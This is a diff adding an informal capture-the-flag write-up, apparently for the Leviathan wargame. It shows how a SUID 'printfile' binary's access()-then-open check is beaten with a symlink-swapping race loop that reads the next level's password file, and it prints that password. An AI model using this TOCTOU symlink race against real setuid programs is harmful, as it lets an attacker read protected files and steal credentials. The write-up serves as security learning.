@@ -1,0 +1,51 @@
+printfile
+leviathan2@leviathan:~$ ls -la
+total 36
+drwxr-xr-x   2 root       root        4096 Jun 14 17:55 .
+drwxr-xr-x 150 root       root        4096 Jun 14 17:57 ..
+-rw-r--r--   1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--   1 root       root        3851 Jun 14 17:36 .bashrc
+-r-sr-x---   1 leviathan3 leviathan2 15076 Jun 14 17:55 printfile
+-rw-r--r--   1 root       root         807 Mar 31  2024 .profile
+leviathan2@leviathan:~$
+
+Agian SUID file with the name "printfile" which makes me think im gonna print the password for Leviathan 3
+
+leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                                                = -1
+puts("You cant have that file..."You cant have that file...
+)                                                         = 27
++++ exited (status 1) +++
+leviathan2@leviathan:~$
+
+But when I tried that it denied me
+
+ echo "test file" > /tmp/test
+./printfile /tmp/test
+test file
+
+but when i run all thos ecommands it runs perfectly, so it the program checks my permissions on whether i can see that file or not
+
+https://linux.die.net/man/2/access went on interwebs to find more information on what the access thing does and one thing in the article is that there is alike a short time interval or something
+before it opens and checks the file so use of this system call should not be used to check whether that user has access to the file. This is called a TOCTOU exploit
+
+U can use something called symlinks to connect this file to another file, so when it checks it sees the bait file, but i have a script that switches the symlink from the
+bait file into the password file, and when it reads it since the delay exists it reads password (hypothesis, very confident due to research)
+
+touch /tmp/bait
+leviathan2@leviathan:~$ ln -s /tmp/bait /tmp/trap
+leviathan2@leviathan:~$ ./printfile /tmp/bait
+leviathan2@leviathan:~$
+
+leviathan2@leviathan:~$ while true; do
+    ln -sf /tmp/bait /tmp/trap
+    ln -sf /etc/leviathan_pass/leviathan3 /tmp/trap
+done &
+[1] 13448
+leviathan2@leviathan:~$ ./printfile /tmp/trap
+You cant have that file...
+leviathan2@leviathan:~$ ./printfile /tmp/trap
+f0n8h2iWLP
+
+I'm actually so surpsied that worked but not rlly cus I read alot of documentation
